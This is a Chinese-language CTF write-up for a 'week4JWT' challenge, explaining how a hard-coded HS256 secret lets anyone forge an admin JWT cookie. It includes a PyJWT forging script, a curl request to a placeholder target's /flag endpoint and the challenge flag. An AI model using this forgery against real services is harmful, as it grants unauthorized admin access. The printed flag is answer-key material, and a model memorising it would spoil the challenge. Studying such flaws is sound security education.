# week4JWT

## 题目简述

应用允许任意用户名和密码登录，并把身份信息放入使用 HS256 签名的 `JWT` Cookie。`/flag` 只检查令牌中的 `user == "admin"` 和 `role == "admin"`。题目源码把对称密钥 `njupt` 直接硬编码在签发与验证逻辑中，因此可自行签发管理员令牌，无需依赖在线 JWT 编辑器或长时间爆破。

## 解题过程

登录接口构造的载荷为：

```python
payload = {
    "user": user,
    "passwd": passwd,
    "uid": str(uuid.uuid4()),
    "role": "guest"
}
response.set_cookie("JWT", generate_jwt(payload, "njupt"))
```

验证端同样使用固定密钥：

```python
res = verify_jwt(request.cookies.get("JWT"), "njupt")
if res["user"] == "admin" and res["role"] == "admin":
    # 返回 flag
```

HS256 是对称签名算法；只要知道密钥，就能修改载荷并计算有效签名。`passwd` 和 `uid` 没有参与权限判断，但保留字段可使结构与正常令牌一致。使用 PyJWT 生成令牌：

```python
import uuid
import jwt

payload = {
    "user": "admin",
    "passwd": "x",
    "uid": str(uuid.uuid4()),
    "role": "admin",
}

token = jwt.encode(payload, "njupt", algorithm="HS256")
if isinstance(token, bytes):
    token = token.decode()
print(token)
```

把输出作为 Cookie `JWT=<token>` 请求 `/flag` 即可：

```text
TOKEN=$(python3 make_token.py)
curl -s --cookie "JWT=${TOKEN}" "http://<TARGET>/flag"
```

仓库中的服务端源码明确给出响应内容：

```text
0xGame{JWT_is_th3_f14g}
```

如果只有黑盒服务而没有源码，才需要对短密钥做字典或枚举攻击；本仓库已直接暴露 `njupt`，继续保留在线解析站、破解器安装步骤和三张文字截图只会掩盖最短且可验证的解法，因此均已移除。

## 方法总结

JWT 的载荷可读并不是漏洞，真正的问题是 HS256 密钥泄露且授权完全信任客户端载荷。读取源码得到 `njupt` 后，重新签发 `user=admin、role=admin` 的令牌即可通过授权检查；其他字段不影响结果。
